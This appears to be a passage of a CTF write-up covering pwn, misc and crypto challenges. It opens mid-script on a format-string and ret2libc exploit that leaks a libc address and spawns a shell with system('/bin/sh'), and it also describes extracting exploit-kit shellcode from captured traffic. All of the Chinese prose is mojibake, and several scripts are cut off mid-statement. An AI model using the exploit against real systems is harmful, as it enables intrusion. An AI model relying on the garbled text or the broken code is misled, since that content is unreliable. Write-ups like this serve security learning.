        sl('2')
        sla('username:','root')
        # raw_input()?
        sa(' password:','a'*16)
        # ia()
        # sl('2')
        # sla('username:','root')
        # # raw_input()?
        # sa(' password:','\x00'*16)
        sla('You can input token:','%15$p')
        sla('4:Logout','2')
        ru('0x')
        lbase=int('0x'+rv(8),16)-0xff71a4df+0xff6cb000
        success('lbase:'+hex(lbase))
        binsh=lbase+876332
        sleep(1)
        sl('3')
        sleep(1)
        sl('3')
        sleep(0.5)
        sl(p32(lbase+0x5919c)*10+p32(binsh)+p32(0)+p32(lbase+libc.sym['system']))
        cn.interactive()
###  RIG
> RIGæ˜¯ä¸€ä¸ªå°æœ‰åæ°”çš„é»‘å®¢ï¼Œåœˆå†…äººéƒ½å«ä»–exploit
> kidã€‚RIGæœ€è¿‘å¼€å‘å‡ºäº†ä¸€å¥—æ”»å‡»å·¥å…·åŒ…ï¼Œåˆ©ç”¨æµè§ˆå™¨æ¼æ´åœ¨ç½‘ç»œä¸Šå…´é£ä½œæµªã€‚ä½œä¸ºä¸€ä¸ªå®‰å…¨å·¥ç¨‹å¸ˆçš„ä½ ï¼Œéœ€è¦ä»æ•è·åˆ°çš„æŠ¥æ–‡ä¸­æ‰¾åˆ°RIGçš„æ”»å‡»æµé‡ï¼Œä»æ”»å‡»æµé‡ä¸­æ‰¾åˆ°RIGä½¿ç”¨çš„shellcodeï¼Œæäº¤shellcodeçš„å‰13ä¸ªå­—èŠ‚çš„å¤§å†™hexæ•°æ®ä½œä¸ºflag,æ¸©é¦¨æç¤º,è¯·å‹¿è½»æ˜“è¿è¡Œå“¦:)
9795åŒ…å¤„æœ‰ä¸€ä¸ªå·¨å¤§çš„HTTPå“åº”åŒ…  
å…¶ä¸­åŒ…å«æ¶æ„jsä»£ç ï¼Œ  
ç”¨ieè°ƒè¯•ï¼Œç‚¹å‡»consoleçš„é”™è¯¯ä¿¡æ¯ï¼Œå¾—åˆ°è¢«è§£å¯†çš„ä¸€å±‚jsä»£ç ï¼Œå…¶ä¸­æœ‰ä¸€æ®µbase64ï¼Œè§£å¯†å¾—åˆ°vbè„šæœ¬ï¼Œå…¶ä¸­`getegeheteegegegege()`å‡½æ•°ç–‘ä¼¼è·å–shellcode
`str`å˜é‡å³ä¸ºhexè¿‡çš„shellcodeï¼Œè·å¾—flag
###  crymisc
> 8.25 is Chinese Valentineâ€™s Day.Yesterday my brother told me he was refused
> by a beautiful girl.He was sooooooooooooo sad and bursted into tears.
ä¸‹ä¸‹æ¥çš„æ–‡ä»¶æ˜¯zipï¼Œæœ‰ä¼ªåŠ å¯†ï¼Œæ”¹äº†å°±ok  
è§£å‡ºä¸€ä¸ªtxtå’Œä¸€ä¸ªjpgï¼Œjpgæœ«å°¾è·Ÿç€çš„å­—ç¬¦ä¸²æ˜¯base64
ç„¶åè¿˜æœ‰ä¸ªzipï¼Œéœ€è¦è‚‰çœ¼è¯†åˆ«ç„¶åæ”¹ä¸ª`50 4B`æ–‡ä»¶å¤´  
è§£å‹å¾—åˆ°å¦ä¸€ä¸ªtxt
    ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’•
codemojiçš„cracker  
`WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe}`
###  capture
    æˆªè·åˆ°çš„è™šæ‹Ÿä¸–ç•Œåˆ°ç°å®ä¸–ç•Œçš„æ¶ˆæ¯
    message captured from virtual world to real world
DM/PL protocol  
è„šæœ¬æœ‰ç‚¹å°é—®é¢˜ï¼Œå•çº¯ä¸€è¡ŒUæˆ–Dè¯»ä¸å‡ºæ¥ï¼Œå°±æŠŠå¯¹åº”çš„æ¢æˆå‰ä¸€è¡Œçš„åæ ‡å°±è¡Œäº†ã€‚
    import turtle
    f=open(r'P:\Downloads\captured.txt','r')
    for i in range(17):
        f.readline()
    turtle.screensize(800000,600000, "green")
    # turtle.setup(width=0.6,height=0.6)
    # turtle.pendown()
    # turtle.goto(3,39)
    # turtle.goto(300,239)
    # turtle.penup()
    turtle.speed(10)
    # for i in range(500):
            # f.readline()
            # f.readline()
            # f.readline()
            # f.readline()
            # f.readline()
    # try:
    if(1):
        while(1):
            cur=f.readline()[46:].split("\r\n")[0][2:-1]
            if(len(cur)
æ ¹æ®é¢˜ç›®æç¤ºï¼Œbell 202 ç¼–ç ï¼Œå¯»æ‰¾å¯ä»¥è¯»å–çš„è½¯ä»¶  
è¿è¡Œ ç›´æ¥å‡ºflag
###  trihistory
docker pull impakho/trihistory:latest
ä¸‹è½½é•œåƒçš„åŒæ—¶å»Docker Hubä¸ŠæŸ¥ä¸€æŸ¥dockerfile
æ¢äº†aptæºï¼Œåˆè£…äº†ä¸ªnginxï¼Œå¯èƒ½nginxçš„wwwé‡Œæœ‰ä¸œè¥¿
ç›´æ¥docker saveï¼ŒæŠŠå„OSIå±‚æ‹½å‡ºæ¥çœ‹çœ‹
01da3848ca6779c0bd598f39d6f95207af92b91be77f97d3f5f21d7d0b202aaeå±‚é‡Œç¡®å®æœ‰/var/www/html/flag.htmlï¼Œä½†æ˜¯åªæœ‰ä¸ªflag
is removed
OSIå±‚148ba1e1d9b5e9970fd2cab3ce9ca0c2d3343504d4af27603a0e1bb9543b13baï¼Œå‘ç°rootä¸‹æœ‰ä¸€histryæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ˜¯ç”¨gitåšç‰ˆæœ¬æ§åˆ¶çš„ç›®å½•
æ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹git histroyï¼Œresetåˆ°47a5ffbd63f271bc627af973d7a949232cfb47c6
ä¹‹åwwwrootä¸‹æœ‰.flag.html.swpï¼Œçœ‹ä¸€ä¸‹Hexå°±è¡Œ
## crypto
###  da Vinci after rsa
    pa = 9749
    pb = 11237753507624591
    pc = 9127680453986244150392840833873266696712898279308227257525736684312919750469261
    mas = GF(pa)(c).nth_root(5, all=True)
    mbs = GF(pb)(c).nth_root(5, all=True)
    mcs = GF(pc)(c).nth_root(5, all=True)
    ms = [] 
    for ma, mb, mc in itertools.product(mas, mbs, mcs): 
        m = ZZ(crt(list(map(ZZ,[ma,mb,mc])), [pa,pb,pc]))
        assert power_mod(m, e, n) == c
        ms.append(m)
rsa è§£å‡ºæ¥ `flag{weadfa9987_adwd23123_454f}`
    key = [1,28657,2,1,3,17711,5,8,13,21,46368,75025,34,55,89,610,377,144,233,1597,2584,4181,6765,10946,987]
    fb = [1,1,2,3,5,8,13,21,34,55,89,144,233,377,610,987,1597,2584,4181,6765,10946,17711,28657,46368,75025]
    c = b'weadfa9987_adwd23123_454f'
    t0 = list(map(fb.index, key))
    t1 = t0[:]
    t0[t0.index(0)] = 1
    t1[t1.index(0, t1.index(0)+1)] = 1
    assert set(t0) == set(t1) == set(range(25))
    bytes([c[t0[i]] for i in range(25)])
    bytes([c[t1[i]] for i in range(25)])
###  elgaml_rsa
çœ‹ä¸å‡ºæ¥å’‹åˆ†è§£ `secret`
`assert(len(flag)==36)` æœ‰ç‚¹çªå…€, å¯èƒ½æœ‰ç”¨
éªŒè¯äº†ä¸‹ `secret` ç¡®å®æ˜¯ `key.py` é‡Œé‚£ä¸ª
ä»£ç å¾ˆåƒ 2018 Code Blue lagalem  
md, yafuç›´æ¥åˆ†è§£, å‰é¢ä¸€å¤§ä¸² elgamal æ˜¯ä¸ªå•¥å­
    factors = [(42044128297, 6), (653551912583, 15), (104280142799213, 6), (28079229001363, 14), (232087313537, 5), (802576647765917, 7)]
    for prime, order in factors:
        assert isPrime(prime)
        assert n % (prime**order) == 0
        n //= prime**order
    assert n == 1
    res = []
    for prime, order in factors:
        mod = prime**order
        phi = prime**order - prime**(order-1)
        g = gcd(e, phi)
        print(g, mod.bit_length())
        if g == 2:
            m2 = pow(c%mod, invert(e//g, phi), mod)
            res.append((m2, mod))
    m2 = crt([res[0][0],res[1][0]], [res[0][1], res[1][1]])
    m = ZZ(sqrt(m2))
    print(bytes.fromhex(hex(m).strip('0x')))
###  what_r_the_noise
çœ‹èµ·æ¥æ­£æ€åˆ†å¸ƒ
    r = remote('124.71.145.165', 9999)
    def f():
        r.sendlineafter(':', '2')
        data = r.recvline().decode().strip()
        return eval('[' + data + ']')
    data = []
    for _ in range(100):
        data.append(f())
    rnd_data = [round(sum([data[i][j] for i in range(len(data))])/len(data)) for j in range(len(data[0]))]
    print(bytes(rnd_data))
ä¼šæœ‰ç‚¹åå·®, ä½†å…¨è‹±æ–‡, ç›¸é‚»çš„å­—æ¯è¯•è¯•å°±å‡ºäº†
###  ezAES
çˆ†ä¸ª key, è§£ä¸ªcbcå°±å¥½äº†
    import itertools
    from Crypto.Util.strxor import strxor
    def chunks(data, bs=16):
        return [data[i:i+bs] for i in range(0, len(data), bs)]
    cipher = 'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'.replace('*', '0')
    cs = chunks(bytes.fromhex(cipher))
    key0 = b'T0EyZaLRzQmNe2'
    def decrypt_block(data):
        global key
        assert len(data) == 16
        aes = AES.new(key, AES.MODE_ECB)
        return aes.decrypt(data)
    for a,b in itertools.product(range(256), repeat=2):
        key = key0 + bytes([a, b])
        h = hashlib.md5(key).hexdigest()
        SECRET = binascii.unhexlify(h)[:10]
        message = b'AES CBC Mode is commonly used in data encryption. What do you know about it?'+SECRET
        message = pad(message)
        ms = chunks(message)
        if strxor(decrypt_block(cs[-1]), ms[-1])[-8:] == cs[-2][-8:]:
            print(key)
            break
    for i in reversed(range(1, len(cs))):
        print(i-1, i)
        cs[i-1] = strxor(decrypt_block(cs[i]), ms[i])
    iv = strxor(decrypt_block(cs[0]), ms[0])
    print('gactf{%s}' % iv.decode())
###  square
è½¬æ¢æˆ pell equation `(4y+3)^2 - 48x^2 = 1`
    def pellsD(d):
        continuedFraction = []
        ao = floor(numerical_approx(sqrt(d)))
        decimal = numerical_approx(sqrt(d)) - floor(numerical_approx(sqrt(d)))
        continuedFraction.append(ao)
        finished = False
        while finished == False:
            continuedFraction.append(floor(numerical_approx(Integer(1)/decimal)))
            if floor(numerical_approx(Integer(1)/decimal)) == Integer(2)*ao:
                finished = True
            else:
                decimal = Integer(1)/decimal - floor(Integer(1)/decimal)
        pList = [Integer(0),Integer(1)]
        qList = [Integer(1),Integer(0)]
        for i in continuedFraction:
            p = i*pList[-Integer(1)] + pList[-Integer(2)]
            pList.append(p)
            q = i*qList[-Integer(1)] + qList[-Integer(2)]
            qList.append(q)
        if (pList[-Integer(2)]**Integer(2)) - d*(qList[-Integer(2)]**Integer(2)) == -Integer(1):
            x = (pList[-Integer(2)]**Integer(2))+(qList[-Integer(2)]**Integer(2))*(d)
            y = Integer(2)*(pList[-Integer(2)])*(qList[-Integer(2)])
            return {'x': x, 'y': y}
        else:
            return {'x': pList[-Integer(2)], 'y': qList[-Integer(2)]}
    data = []
    res = list(pellsD(48).values())
    k = res[0]
    l = res[1]
    lD = l * a
    while len(data) ] x: ', str(x))
        r.sendlineafter('[>] y: ', str(y))
    r.interactive()
###  babycrypto
çœ‹èµ·æ¥åƒ diffie hellman over complex number
p éƒ½ä¸ç»™å’‹æ•´? å¯èƒ½ mov?
m0leCon CTF 2020 Teaser â€” King Exchange
    p = gcd(A[0]^2 + A[1]^2 - 1, B[0]^2 + B[1]^2 - 1)
    p = factor(p)[-1][0]
    assert is_prime(p)
    F = GF(p)
    R. = PolynomialRing(F)
    K. = F.extension(w^2 + 1)
    g_K = g[0] + g[1]*w
    B_K = B[0] + B[1]*w
    b = discrete_log(B_K, g_K)
    print(b)
    print(multiply(g, b) == B)